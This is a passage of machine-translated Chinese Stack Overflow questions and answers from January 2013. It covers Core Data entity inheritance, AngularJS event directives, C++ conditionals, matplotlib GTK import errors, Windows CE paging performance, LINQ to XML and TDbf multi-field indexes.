我在核心数据模型中的父子实体中有一个小问题。我的核心数据模型有一个 Person 实体，它可以有许多 googleplus 帐户或 twitter 帐户链接到它。由于这两个实体；GooglePlus 和 Twitter 在某种程度上与它们的属性相似，我想创建一个名为 SocialConnection 的抽象实体。现在，我的 Person 实体与 SocialConnection 实体具有多对多关系，而 SocialConnection 实体又是 GooglePlus 和 Twitter 的父级。

```
Person  <----->> SocialIdentifier ---- Child ---- GooglePlus
                     |
                     |
                   Child
                     |
                     |
                  Twitter 
```

我的图形模型如下图所示。

![在此处输入图像描述](../Images/e3b0afbec71248029c0aae1c6fcbd3fb.png)

现在，我这里有一个情况。Person 有一个名为 socialConnections 的属性，它将获取所有连接，无论它是 Twitter 对象还是 GooglePlus 对象。但是，有时我想只获取 twitter 和 GooglePlus。我该怎么做。

我认为一个想法是从 SocialIdentifier 指向 Person 实体的反向关系，并让 Person 创建与每个孩子的正向关系。

它将表示为；

```
Person  <----------- SocialIdentifier -------- Child --------GooglePlus----->> Person
                              |
                              |
                            Child
                              |
                              |
          Person  <<------- Twitter 
```

图示; ![在此处输入图像描述](../Images/100954d249f7c31add59b3bd8cad35cf.png)

但是，即使有这种表示，我也面临一些问题。我可以从 Person 模型中获取 google 和 twitter，但它没有引用 SocialConnections 即。所有的连接。而且，我觉得这是多余的，因为第一个简化了设计。我确信对第一个进行一些调整会产生所需的结果，但我无法弄清楚。

我如何直接从第一个模型中获取推特或谷歌，或者是否可以在不使用谓词的情况下从 Person 模型中获取所有连接。我相信有一些非常巧妙的解决方案。我要提前感谢您的帮助和建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:38:21.910

我不会为此建立新的关系。您可以使用几种不同的方法。

### 获取的属性

给出`Person`一个名为 的新获取的属性`twitters`。将目标实体设置为`Twitter`并将提取谓词设置为`person==$FETCH_SOURCE`。然后只需询问`twitters`何时需要它的价值。（是的，您出于某种原因没有说谓词，但老实说，它是这里工作的正确工具）。

这里的好处是您不必维持新的关系。如果您将新的 Twitter 帐户添加到`socialConnections`，它会自动成为`twitters`.

### 过滤集合

如果数量不多，`socialConnections`那么在代码中过滤它可能更容易，而不是让 Core Data 来做。获取每个`socialConnections`对象并过滤集合，例如：

```
NSEntityDescription *twitterEntity = [NSEntityDescription entityForName:@"Twitter" inManagedObjectContext:[self managedObjectContext]];

NSSet *twitters = [[person valueForKey:@"socialConnections"] objectsPassingTest:^BOOL(id obj, BOOL *stop) {
    return [[obj entity] isKindOfEntity:twitterEntity];
}]; 
```

这贯穿了每一个社交联系，并且只获得了 Twitter 帐户。

# angularjs - AngularJS：ng-click 是“一个好习惯”吗？为什么AngularJS中没有ng-{event}？

> ID：14346073
> 
> 赞同：58
> 
> 时间：2013-01-15T20:15:21.647
> 
> 标签：angularjs, dom-events

我刚开始学习 AngularJS 并与 AngularJS 的一些概念作斗争。如果有人能解释我一些观点，那就太好了......

1.  我了解这`ng-click`在技术上与`onclick`（请参阅[此处](https://stackoverflow.com/questions/11902379/why-do-we-need-ng-click)）不同，但两者都放置在标记中。我认为这将是一个“不好的做法”？如果大多数人说这是“坏”，为什么这是 AngularJS 的核心概念之一？我认为从 JavaScript 中选择 DOM 元素而不是在标记中放置逻辑会更好。

2.  如果`ng-click`是对 AngularJS 中的单击事件做出反应的正确方法，我应该如何处理其他 DOM 事件？我看到还有其他几个指令，例如`ng-mouseover`，但并非所有 DOM 事件都具有 AngularJS 等价物。我将如何处理 AngularJS 中的“drop”事件（因此以 AngularJS 方式 - 不是正常方式）？明确一点：我想[将一个文件拖到我的 webapp](http://www.html5rocks.com/de/tutorials/dnd/basics/)中。

非常感谢，皮波

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2013-01-15T20:42:20.007

> 如果大多数人说这是“坏”，为什么这是 AngularJS 的核心概念之一？

好吧，真正喜欢[Unobtrusive JavaScript](http://en.wikipedia.org/wiki/Unobtrusive_JavaScript)的人可能会说它很糟糕。Angularians（以及那些有弹性背景的人）看到了更具声明性的方法的价值。

> “Angular 的构建基于这样一种信念，即在构建 UI 和将软件组件连接在一起时，声明式代码比命令式代码更好......通过以声明方式描述 UI 应该如何随着应用程序状态的变化而变化，您可以从低级 DOM 操作中解脱出来任务[。-- 概述文档](http://docs.angularjs.org/guide/overview)

另请参阅[Bootstrap、Angular.js 和 Ember.js 中使用的数据属性选项是否与 Unobtrusive Javascript 原则冲突？](https://stackoverflow.com/questions/12978507/dont-the-data-attribute-options-used-in-bootstrap-angular-js-and-ember-js-con)

> 我应该如何处理其他 DOM 事件？

编写您自己的指令来倾听它们（或找到其他人已经编写的指令）。Angular 赋予你扩展浏览器功能的能力——通过编写你自己的指令。

**更新**：在下面的评论中，Tim Stewart 提到了 AngularUI 的[ui-event](http://angular-ui.github.com/#directives-event)，它允许您将回调绑定到 Angular 本身不支持的任何事件。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-07-21T20:30:09.013

从本质上讲，Angular 需要标记中的元素才能正常运行。此外，在大多数情况下，这些元素每次更改时都必须“编译”。所以，不管 JavaScript 是什么，它已经有点“突兀”了。您不能简单地替换标记，并像使用 jQuery 之类的东西一样为您自动绑定所有内容。

严格来说，不显眼的 JavaScript： 1\. 分离结构和行为，以使您的代码更清晰和脚本维护更容易 2\. 抢占浏览器不兼容性 3\. 使用干净的语义 HTML 层（[维基百科](http://www.w3.org/wiki/The_principles_of_unobtrusive_JavaScript)）

那肯定不是 Angular。为了实现对所有事物的双向绑定，他们选择在 DOM 中创建自定义绑定点，而不是像 jQuery 那样使用类名或 ID。（一种有点不标准的方法，但它显然有效。）

但真正的想法是这样的：基本上，标记的每个受控部分都不再是真正的 HTML。它现在更像是一个模板，因此需要与准备渲染的引擎进行交互。因此，不显眼的传统规则并不真正适用......（FWIW，我是 jQuery.on() 函数的忠实粉丝/用户，当元素添加到页面时，它会自动将元素绑定到事件。非常干净和灵活，恕我直言，我希望在 Angular 中有类似的机制。我喜欢在页面上的多个位置向项目添加一个类，自动调用相同的事件处理程序。有一个地方可以更改代码是好东西。但我离题了......）

对我来说，更大的问题是渐进式设计。网页是否在没有启用 JavaScript 的情况下工作？真的有人在乎吗？嗯……

# java - 如何从 CSV 文件生成网络地图图形？

> ID：14346076
> 
> 赞同：0
> 
> 时间：2013-01-15T20:15:36.363
> 
> 标签：java, networking

如果我有一个看起来像这样的简单网络信息列表，我如何以编程方式生成图形网络地图？我只是在寻找关于我可以检查和尝试哪些 Java API 的想法。

```
System   | Related-To       |  Parent
System1  |   System6        |
System2  |                  |  System1
System3  |                  |  System1
System4  |   System6        |  System1
System5  |                  |  System1
System6  |                  |  System4
System7  | System2, System3 | System4
System7  |   System5        | System1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:20:15.630

我会研究开源 JFreeChart 库来帮助处理图形元素。

# c++ - 检查 IF 语句中的多个 OR 运算符

> ID：14346080
> 
> 赞同：3
> 
> 时间：2013-01-15T20:15:56.550
> 
> 标签：c++, if-statement, conditional-statements

我有以下 C++ 代码：

```
if(x==y||m==n){
cout<<"Your message"<<endl;
} 
```

如果 x 等于 y 或 m 等于 n，程序将打印“Your message”。但如果两个条件都为真，程序只测试其中一个并最终打印一个“Your Message”。

有没有办法`"Your message"`使用单个 if 语句根据每个条件独立打印每个？

使用多个 if 语句，输出将与以下相同。

```
if(x==y){
cout<<"Your message"<<endl;
}

if (m==n){
cout<<"Your message"<<endl;
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-15T20:22:15.380

并不是说我会这样做，但是...

```
for(int i = 0; i < (x==y)+(m==n); ++i) {
  std::cout << "Your message\n";
} 
```

* * *

让我对此进行扩展。我永远不会这样做，因为它违反了两个原则：

1) 可维护性代码。这个循环会导致维护者停下来思考，并试图恢复你的初衷。一对`if`语句不会。

2）不同的输入应该产生不同的输出。这个原则有利于用户和程序员。没有什么比运行测试、获得有效输出但**仍然**不知道程序走哪条路径更令人沮丧的了。

鉴于这两个原则，以下是我实际编码的方式：

```
if(x==y) {
  std::cout << "Your x-y message\n";
}
if(m==n) {
  std::cout << "Your m-n message\n";
} 
```

^(`endl`旁白：当你的意思是不要使用`\n`。它们产生语义相同的代码，但`endl`可能会意外地使您的程序运行得更慢。)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:22:31.797

我不认为这是可能的。括号内的内容是对或错的陈述，没有真/真或真/假陈述之类的东西。您可以做的是带有 break 语句的 do/while 循环。但我不认为这是要走的路。为什么要避免两个 if 语句？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:27:57.337

单“|” 或“&”保证双方评估，即使结果可以由左侧运算符单独确定。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T20:26:10.113

你可以做这样的事情来建立“信息”：

```
string msg = "Your Message\n";
string buildSt = x == y ? m == n ? msg + msg : msg : m == n ? msg : ""; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T20:46:48.880

当两个条件都为真时，编译器只检查一个条件，因为您已将条件与 OR 连接起来。如果 OR 链中的一个条件为真，则无需检查其他条件，因为结果已经为真，如果其中一个条件为假，则为假。因此，如果您认为您的逻辑是正确的，则无需进行多次检查。您的代码要求您在其中一个条件为真时打印一条消息并执行此操作。如果您想要两个条件都为真的情况下的特殊内容，请单独添加。很快，您就永远不要期望编译器对由 OR 连接的表达式进行所有检查。

问候，

吊艇架

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2013-01-15T20:22:35.593

测试代码：

```
#include <iostream>
#include <string>
using namespace std;

void main() {
    int x=1;
    int y=1;
    int m=1;
    int n=1;
    string mess1="Your message 1\n";
    string mess2="Your message 2\n";
    cout<<((x==y)?mess1:"")+((m==n)?mess2:"");
    getchar();
} 
```

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2013-01-15T20:24:01.393

如果你想看看这两个陈述是否都是真的，那么这`&&`就是你想要使用的。

查看[布尔运算符](http://en.wikipedia.org/wiki/Operators_in_C_and_C++)以查看比较布尔（真/假）值时的所有可能选项。

要回答您的问题：

```
 if ((x==y) && (m==n))
    {
        cout<<"Your Message"<<endl<<"Your Message"<<endl;
    }
    else if((x==y) || (m==n))  
    {
        cout<<"Your Message"<<endl;
    } 
```

# mysql - 将 sql 紧凑型数据库转换为 MySQL sql 文件

> ID：14346082
> 
> 赞同：1
> 
> 时间：2013-01-15T20:15:58.350
> 
> 标签：mysql, sql, sql-server-ce

我正在寻找一个 smaill windows 程序来将小型 sql 紧凑型数据库 (.sdf) 转换为 mySql 的 (.sql)。请推荐一个。已经尝试过 ExportSqlCe40.exe。谢谢你。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-16T12:17:42.657

解决了！下载[这个](http://primeworks-mobile.com/Downloads/Files/DPW/DPW_2.3.633.html)以将 sdf 转换为 accdb，然后[将](http://www.bullzip.com/download/a2m/msa2mys_5_1_0_232.zip)其导出到我的 MySQL 服务器。

# api - 在 Google Analytics 会话中获取数据

> ID：14346085
> 
> 赞同：0
> 
> 时间：2013-01-15T20:16:12.040
> 
> 标签：api, google-analytics

我在我的网站上使用 Google Analytics，我想知道是否可以对 GA 进行 Javascript 调用以获取有关当前访问者的某些信息，例如人员当前位置。

GA 是否有允许获取会话特定信息的页面 API？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T15:49:48.407

Google Analytics 不为单个访问者提供数据（不是通过 API 或其他方式 - 这是一个隐私问题），所以答案是否定的。

除了 GA 中的大多数数据无论如何都是从用户浏览器中提取的，因此查询 GA 以获取它将是不必要的往返。

对于位置，有基于 IP 的服务（例如 ip2location.com）或 HTML5 地理定位 API。

# python - ImportError：没有名为 _backend_gdk 的模块

> ID：14346090
> 
> 赞同：12
> 
> 时间：2013-01-15T20:16:28.133
> 
> 标签：python, matplotlib, pygtk

我开始深入了解使用 pyGTK+ 使用 python 和 matplotlib 进行交互式绘图。因此，我查看[了 matplotlib 网站上给出的示例](http://matplotlib.org/examples/user_interfaces/gtk_spreadsheet.html)。

这是代码的简短摘录：

```
#!/usr/bin/env python
"""
Example of embedding matplotlib in an application and interacting with
a treeview to store data.  Double click on an entry to update plot
data

"""
import pygtk
pygtk.require('2.0')
import gtk
from gtk import gdk

import matplotlib
matplotlib.use('GTKAgg')  # or 'GTK'
from matplotlib.backends.backend_gtk import FigureCanvasGTK as FigureCanvas

from numpy.random import random
from matplotlib.figure import Figure 
```

我尝试在终端中运行此脚本时出现以下错误：

```
Traceback (most recent call last):
  File "gtk_spreadsheet.py", line 15, in <module>
    from matplotlib.backends.backend_gtk import FigureCanvasGTK as FigureCanvas
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/matplotlib/backends/backend_gtk.py", line 33, in <module>
    from matplotlib.backends.backend_gdk import RendererGDK, FigureCanvasGDK
  File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/matplotlib/backends/backend_gdk.py", line 29, in <module>
    from matplotlib.backends._backend_gdk import pixbuf_get_pixels_array
ImportError: No module named _backend_gdk 
```

我安装了 python 2.7 和 pygtk 2.24。

任何人都可以找出错误的位置吗？我认为它可能与一些链接问题有关？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-05T16:48:08.250

请注意，您需要的 Debian/Ubuntu 软件包不是“pygtk2-devel”而是“python-gtk2-dev”：

```
sudo apt-get install python-gtk2-dev 
```

应该在这些平台上修复此错误。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-02-16T19:34:50.137

This was a symptom of using a pip-installed matplotlib instead of an apt-installed matplotlib on my system, just now. If on Ubuntu/Debian, try:

```
pip uninstall matplotlib
apt install python-matplotlib 
```

I believe what was happening is that the pip-install didn't build the C extension required for GTK output, but the apt package has the extension prebuilt. I don't have logs from the initial pip install of matplotlib, so I can't confirm that that's what happened.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-07-27T09:03:07.773

除了 Haldean Brown 的回答，请注意，如果您真的需要使用 pip，您可以强制它在本地重新编译 matplotlib 并使用以下`--no-binary`选项获得“setup.py 所做的深层魔法”：

```
pip uninstall matplotlib
pip install matplotlib --no-binary=matplotlib 
```

这将解决您的问题，前提是您已经安装了 gtk2`sudo apt-get install python-gtk2-dev`

当您想使用 GTKAgg 后端时，使用 pip 可能会在未来将 matplotlib 冻结在支持它的版本（弃用警告指出它将在 3.0 中删除）：

```
pip install matplotlib==2.2.2 --no-binary=matplotlib 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-12-12T21:47:29.127

Ubuntu 18.04 有一个损坏的 matplotlib 包。看到这个错误：[https ://bugs.launchpad.net/ubuntu/+source/matplotlib/+bug/1785458](https://bugs.launchpad.net/ubuntu/+source/matplotlib/+bug/1785458)

您可以自己编译 matplotlib（例如使用 pip）或使用错误报告中链接的 PPA。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-03-05T23:20:10.973

如果您正在运行 py2.7 应用程序，请尝试：

```
pip2 install matplotlib --no-binary=matplotlib 
```

# javascript - 更改布尔值（Jquery/Javascript）

> ID：14346099
> 
> 赞同：1
> 
> 时间：2013-01-15T20:17:14.130
> 
> 标签：javascript, jquery, function, boolean

我正在尝试通过使用函数对此值进行布尔更改。我试过这样：

```
var itemInStock = false;

$("#button").click(function(){
    itemInStock = true
}
if( itemInStock === false){
    document.write("item is out of stock");
} else{
    document.write("item is in stock");
} 
```

我明白为什么它不起作用，但我找不到解决这个问题的方法！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:25:40.323

我只能猜到你想要达到的目标。似乎您想在某个时候检查该物品当前是否有库存。由于您无法知道点击何时发生，因此一种解决方案可能是定期检查该值。

```
(function () {
    var itemInStock = false;

    $("#button").click(function () {
        itemInStock = true
    });

    window.setInterval(function () {

        if (itemInStock === false) {
            console.log("item is out of stock");
        } else {
            console.log("item is in stock");
        }

    }, 500);
})() 
```

[http://jsfiddle.net/Ttu5N/](http://jsfiddle.net/Ttu5N/)

告诉我，如果我的猜测有误。

更新：更简单的方法

```
$(function () {
    var $state = $('#state');

  $state.text('item is out of stock');

    $("#button").click(function () {
        $state.text('item is in stock');
    });

})

<button id="button">click me</button>
<div id="state"></div> 
```

[http://jsfiddle.net/Wb3ET/](http://jsfiddle.net/Wb3ET/) 直接点击即可。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:23:25.077

您不能在加载后使用 document.write 并且也没有必要在单击按钮时而不是之前更改布尔值

创建一个 id="status" 的跨度并拥有

```
var itemInStock = false;
$(function() {  
  $("#button").click(function(){
    itemInStock = true;

    $("#status").html("item is in stock":
  }

  $("#status").html(itemInStock?"item is in stock":"item is out ofstock");
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T20:30:04.203

```
// HTML
<div id="status">item is out of stock by default</div>

// JS
var itemInStock = false;

$("#button").click(function(){
    itemInStock = true;
}, changeStatus());

function changeStatus(){
    if( itemInStock === false){
         $('#status').html("item is out of stock");
    } else{
         $('#status').html("item is in stock");
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T20:21:47.807

因为 itemInStock 在单击按钮之前不会更改...

# c++ - Windows CE 5 和 6 之间的互锁 API

> ID：14346100
> 
> 赞同：2
> 
> 时间：2013-01-15T20:17:16.207
> 
> 标签：c++, multithreading, visual-studio, windows-ce

我目前正在将 VS2005 C++ 应用程序从 CE5 移植到 CE6，并且遇到了严重的性能问题。到目前为止，检索动态内容的单个 HTTP 请求在 CE5 上需要 40 毫秒，在 CE6 上需要 350 毫秒。由于我已经清理了一堆低效率，提高了两个系统的性能，这些值过去更糟，但目前我被困在那个延迟上。作为记录，这两项测试都是在同一台机器上进行的，并且网络服务器不是 CE 提供的服务器，而是用 C++ 实现的自定义服务器。另请注意，问题不在于网络 IO，CE6 在提供静态文件时甚至在同一台机器上的性能优于 CE5，而在于动态内容处理。

在试图弄清楚为什么程序执行如此糟糕的过程中，我偶然发现了一些让我感到困惑的事情：在 CE5 下，用于 x86 的 Interlocked* API 既不使用编译器内在函数，也不使用真正的函数调用，而是使用内联汇编代码。这段代码有一条注释说，内在函数包含仅多处理器系统需要的锁定前缀，并且会减慢仅在 CE5 等单核上运行的代码。在 CE6 上，这些函数是使用编译器内部函数（包括锁定前缀）实现的。由于这些函数被 Boost 和 STLport 等使用，它们都在网络服务器内部使用，我想知道这些函数是否是罪魁祸首。

我注意到的另一件事是一些字符串解析函数需要很长时间。更糟糕的是，似乎在第一次之后第二次调用相同的函数花费的时间更少，所以看起来好像正在进行某种缓存。由于这是一个通过 TCP 接收并在内存中解析的短字符串（<1kB），我无法想象哪个缓存可能对此负责。唯一的缓存可能是指令缓存，但程序不大于 CE5 版本，如果代码从未缓存的内存中运行，则不会显示这些缓存效果。

TLDR - 问题：

*   CE6 是否能够处理多个处理器？
*   有没有一种简单的方法可以告诉编译器它应该省略锁定前缀？我目前实现这一目标的方法是简单地从 CE5 SDK 复制内联程序集，但这太难看了。
*   我也很感激任何其他建议看什么或尝试什么。提前谢谢了！

**总结**依赖可执行文件没有问题，更不用说Interlocked API了。运行相同的可执行文件证明了这一点。但是，在具有不同平台设置的不同机器上运行会有所不同。我们现在回到 Platform Builder，试图找出两个平台之间的差异。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:29:17.127

1.  否。 SMP 支持需要 WEC7。OEM 很可能在 CE6 中禁用了其他内核。

2.  没有我知道的。

3.  要么使用[性能分析工具](http://msdn.microsoft.com/en-us/library/ee480251%28v=winembedded.60%29.aspx)，要么使用计时调用来检测代码，以缩小耗时过长的地方。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-29T22:28:44.533

我终于找到了性能行为的原因，它只是分页。CE6 有一个池管理器（请参阅[http://blogs.msdn.com/b/ce_base/archive/2008/01/19/paging-and-the-windows-ce-paging-pool.aspx](http://blogs.msdn.com/b/ce_base/archive/2008/01/19/paging-and-the-windows-ce-paging-pool.aspx)）处理未使用的分页映射的 DLL 和 EXE。当映射的二进制文件的数量超过一定大小时，它开始（以低优先级）页出内存。默认情况下，它开始分页时的限制仅为 3MiB，这对于当前的应用程序来说是相当低的。此外，缓存不是 LRU 缓存，只是按照页面加载的顺序丢弃页面。

事实证明，我们的系统超过了这个限制，导致分页开始。由于使用的算法，它总是会丢弃使用过的那些，然后必须再次调入。提供静态文件的代码很小，因此受此限制的影响不大。不过，为动态页面提供服务的代码要大得多，因此它会对 IO 的整个系统造成严重破坏。这也解释了为什么问题不能归因于特定的代码，不是代码本身，而是加载它。

我通过 IOCTL_HAL_GET_POOL_PARAMETERS 检测到了这一点，它给了我相关的配置参数、当前状态、pageout-thread 运行的频率以及多长时间（尽管后者只是换出页面所需的时间）。既然我知道我在寻找什么，我也应该能够在内核跟踪器中找到由此产生的页面错误。我还可以观察到 CF 卡适配器上的活动 LED 现在在首次加载文件时亮起，但在随后的请求中不会亮起，因为它是从缓存中获取的。这过去总是导致 LED 在动态页面上闪烁。

简单的解决方案是增加池管理器的限制，因此它不会开始扔东西。这可以通过使用相应值修补 kernel.dll 在 config.bib 中轻松完成。或者，减小可执行文件的大小会有所帮助，但这并不容易。

# c# - 如何访问更深的 xdocument 节点？

> ID：14346104
> 
> 赞同：0
> 
> 时间：2013-01-15T20:17:29.393
> 
> 标签：c#, xml, linq-to-xml

我有以下 XML 文件：

```
<Invoice_Ack>
    <Invoices>
        <Invoice>
            <Invoice_Number>123456</Invoice_Number>
            <Status>Rejected</Status>
            <Detail_Errors>
                <Detail_Error>
                    <ErrorID>0001</ErrorID>
                    <ErrorMessage>This is the error message</ErrorMessage>
                </Detail_Error>
                <Detail_Error>
                    <ErrorID>0502</ErrorID>
                    <ErrorMessage>This is another error message</ErrorMessage>
                </Detail_Error>
            </Detail_Errors>
        </Invoice>
    </Invoices>
</Invoice_Ack> 
```

我可以使用以下代码访问“Invoice_Number”和“Status”节点，但我不确定如何获取“ErrorMessage”节点。这是我所拥有的：

```
XDocument doc = XDocument.Load(file);

foreach(var invoice in doc.Descendants("Invoice"))
{
    string status = invoice.Element("Status").Value;
    string invoicenum = invoice.Element("Invoice_Number").Value;
} 
```

但是我如何获得错误消息？我试过

```
string error = invoice.Element("Detail_Errors").Element("Detail_Error").Element("ErrorMessage").Value; 
```

但这给了我“对象引用未设置为对象的实例”错误。

这还能怎么做？谢谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:34:18.697

您提供的代码适用于您提供的 XML。我怀疑你实际上有一张没有任何错误的发票*——*这就是问题所在。

您应该遍历错误：

```
foreach (var error in invoice.Elements("Detail_Errors").Elements("Detail_Error"))
{
    var id = error.Element("ErrorID").Value;
    var message = error.Element("ErrorMessage").Value;
    // Do whatever you want with the ID and message
} 
```

注意`Elements("Detail_Errors")`这里的使用 - 如果*总是*只有一个`Detail_Errors`元素（可能没有子元素），你可以使用`Element("Detail_Errors")`，但即使*没有* `Detail_Errors`元素，我给出的代码也可以工作。

# jquery - JQuery 更新数据属性

> ID：14346105
> 
> 赞同：2
> 
> 时间：2013-01-15T20:17:34.533
> 
> 标签：jquery, dom

考虑以下相册示例。

专辑的第一页和最后一页是专辑展开的一半大小。我设置`attr('data-width')`and`attr('data-width_correct')`进行比较

***例如——checkImageDimesions()***

```
//Define if first or last page
if($(this).is(':first-child') || $(this).is(':last-child'))
{
    $(this).find('img').attr('data-height_correct' , maxHeight);
    $(this).find('img').attr('data-width_correct' , maxWidth / 2);  
} else{
    $(this).find('img').attr('data-height_correct' , maxHeight);
    $(this).find('img').attr('data-width_correct' , maxWidth);  
} 
```

这可以按预期工作，使用正确的值更新数据。我的下一步是如果`width > width_correct`我想添加一类调整大小。

```
if($(this).find('img').data('width') > $(this).find('img').data('width_correct'))
{

     $(this).addClass('resize');
} 
```

该函数的调用发生在 jQuery .sortable() 成功的情况下。在第一次排序时，这可以正常工作，但是在随后的排序中，大小不正确的初始图像会保留原始图像，并且不会分配`.resize`任何会返回 false 的新图像`width > width_correct``resize`

**可排序**

```
$("#sortable").sortable(
{
success: function(){checkImageDimension()} 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:28:43.200

> 将对象数据（不是简单的字符串、数字或布尔值）附加到 DOM 节点通常会导致 Internet Explorer 中的内存泄漏。那是因为 DOM 节点不是 IE 中的原生 Javascript 对象，所以它不知道如何垃圾收集附加到它们的东西。
> 
> 如果您只需要 DOM 节点上的简单标志或数字，则可以使用 attr("x_mycount", 1) 或仅使用 this.x_mycount 在 DOM 节点上设置属性。（请小心选择属性或属性名称，因为您在 DOM 命名空间中，如果您不小心，可能会破坏某些内容。）但使用 .data() 是最安全的。

来源：[forum.jquery.com/topic/when-to-use-attr-vs-data](http://forum.jquery.com/topic/when-to-use-attr-vs-data)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:20:36.987

要更新数据属性，您只需向数据函数添加第二个参数。

```
$('#elementID').data('width-correct', '400'); 
```

就是这样，它会更新。

# .net - 程序终止后 Task.Run() 安排的工作会发生什么？

> ID：14346108
> 
> 赞同：6
> 
> 时间：2013-01-15T20:17:42.593
> 
> 标签：.net, task-parallel-library

我正在使用 TPL 和 async/await 进行一些测试，并注意到一些我发现意外的事情：我正在安排使用 lambdas 和 Task.Run 运行的工作，例如：

```
Task.Run(()=>Console.WriteLine("Nice program")); 
```

然后我意识到，如果程序立即返回，则永远不会执行工作。这是任何 .NET 应用程序（WPF、Forms 等）中的预期行为吗？有没有讨论这个的文档？

这意味着 Task.Run 实际上是不适用的即发即弃的场景。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-01-15T20:23:36.267

> 这意味着 Task.Run 实际上是不适用的即发即弃的场景。

好吧，你*不想*忘记——你想等到它完成。所以使用`Task`返回给你的那个。

为此，您需要跟踪以这种方式启动的所有未完成任务，然后`Task.WaitAll(tasks)`在非后台线程中使用类似的东西。您可能不需要记住任务本身 - 您只需要有一个在每个任务完成时递减的计数器，然后您只需要等待它变为零。

老实说，如果不了解更多关于您的情况，很难给出比这更具体的建议……但这样的事情肯定会奏效。

当然，您可以轻松地将其封装在您自己的便捷方法中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T21:24:42.260

根据定义，程序终止后，任何代码都无法运行。这与`Task.Run()`.

如果您实际上要问的是：

> `Task`s 在后台线程上运行，所以如果主线程完成（例如，在用户关闭主窗口之后），它们不能保证运行完成甚至启动，我该如何解决这个问题？

然后有两个选择：要么不让主线程完成（例如，`Task.WaitAll()`按照 Jon Skeet 的建议调用），要么`Task`在前台线程上运行您的重要 s。为此，您可以使用`QueuedTaskScheduler`ParallelExtensionsExtras。

# database - Tdbf / tdataset在delphi中对多个字段进行排序

> ID：14346113
> 
> 赞同：3
> 
> 时间：2013-01-15T20:18:03.647
> 
> 标签：database, delphi, sorting, field, tdbf

我有一个使用基于 tdataset 的 tdbf 的 delphi 应用程序，其优点是不需要 bde 引擎。我需要对表进行排序，我通过添加一个 indexdef 然后指定 indexfieldnames 来对单个字段进行排序。

我现在正试图让它在 2 个字段上排序，即将男性分组在一起，然后将女性分组，然后将每个组按薪水排序，这样我们就可以看到女性从最低收入到最高收入，然后以同样的方式跟随男性。

我已经阅读了所有材料，说明您只需将 indexdef 的排序字段指定为“性别+薪水”。当我尝试使用索引时，我被告知“+”不是有效的字段名。我已经尝试了'.'的每个分隔符。'，'。'＆' 和 ';'。每个分隔符都被视为一个不存在的字段。在多个字段上对表格进行排序的正确方法是什么？

在此先感谢克林顿英国人

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T01:44:15.937

`xBASE`（dBASE 及其衍生产品）要求索引中的字段全部转换为相同的数据类型，通常是字符串。为此，通常需要一些常用功能：

*   DTOS() - 将 xBASE 日期转换`CCYYMMDD`为字符串格式
*   STR() - 将数字转换为字符串，带有可选的宽度说明符（默认为 10）和小数点右侧的位数。具体来说，语法被指定为`STR(<numeric> [, <width> [, <decimaldigits>] ])`.
*   SUBSTR() - 从另一个字符串中提取一部分，具有指定的起始位置和字符数
*   IIF() - 立即 IF，用于转换逻辑（例如，`IIF(Married = .T., 'Y', 'N')`

索引表达式确实与`+`运算符结合在一起。您收到的错误可能是因为您尚未转换为通用数据类型。

当您指定`Gender`列（可能定义为`CHAR 1`）和`Salary`列（可能是`NUMERIC`某种大小）时，您可以使用类似

```
Dbf1.AddIndex('GENDER_SAL', 'GENDER + STR(SALARY, 10, 0)', []); 
```

`F 10000`这会在, , 之类的表达式上创建一个索引`F 200000`，`M 12000`其中`SALARY`将转换为 10 个字符的默认宽度（左填充空格）并且没有十进制数字。这应该适合你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:01:09.120

我没有使用过该组件，但看起来他们想要使用类似于我们在 dBase III 中使用的索引表达式。在文档的 PDF 版本的第 7 页，他们在表达式主题下提供了一个示例：

```
Dbf1\. AddIndex('INDEX1 ', 'DTOS( DATEFIELD)+ SUBSTR ( LONGFIELD ,1 ,10)+ SUBSTR
( LONGFIELD2 ,1 ,20)', []); 
```

您可以使用包含整个字符串的参数在您的字段上尝试他们的 SubStr 函数，看看是否至少可以为您提供结果。

# amazon-web-services - 无法 RDP 到 EC2 实例

> ID：14346114
> 
> 赞同：13
> 
> 时间：2013-01-15T20:18:06.450
> 
> 标签：amazon-web-services, amazon-ec2, rdp, hyper-v

